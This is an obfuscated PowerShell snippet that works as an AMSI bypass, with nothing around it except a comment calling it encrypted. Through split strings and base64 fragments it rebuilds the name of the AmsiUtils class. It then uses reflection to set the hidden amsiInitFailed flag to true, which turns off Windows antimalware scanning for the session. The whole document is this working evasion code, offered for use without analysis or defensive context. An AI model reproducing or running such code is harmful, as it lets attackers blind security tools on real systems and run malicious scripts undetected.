${w} = ("{11}{2}{6}{13}{9}{5}{8}{0}{4}{7}{3}{10}{1}{12}"-f('B1'+'AH'),'uA',('B5'+'A'+'HM'+'A'+'d'+(('A'+('B'+('lA'+'G')))+'0'+('AL'+'g'))+('B'+('NA'+'G'))),('B'+((('tA'+'G')+'E')+'A')),'Q',(((('U'+'Ab')+'gB')+'0')+'A'+'C'+'4A'),'EA',('Ab'+'w'),'QQ',(((('AG'+'c')+'A')+'Z'+'Q')+('Bt'+'A')+'G'),('d'+(('AB'+'pA')+('G'+'8A')+'bg')+'A'),'Uw',('EE'+'A'),(('b'+'gB')+'h'));${c} = ("{0}{1}{2}"-f (('c'+'wB')+'p'),('A'+'A='),'=');${M} = ("{0}{3}{1}{2}{4}" -f 'VQ',('k'+('Ab'+'A')),'Bz',('B0'+'AG'),('AA'+'=='));${ASSEM`B`ly} = [Ref].Assembly.GetType(('{0}m{1}{2}' -f [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${w})),[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${c})),[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${M}))));${F`i`ELd} = ${ass`EmB`Ly}.GetField(('am{0}InitFailed' -f [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${c}))),("{0}{3}{1}{2}{4}"-f ('No'+'nP'),('c,'+'St'+'at'),'i',('u'+('bl'+'i')),'c'));${F`ie`Ld}.SetValue(${NU`Ll},${TR`Ue})
#amsi-bypass is encrypted
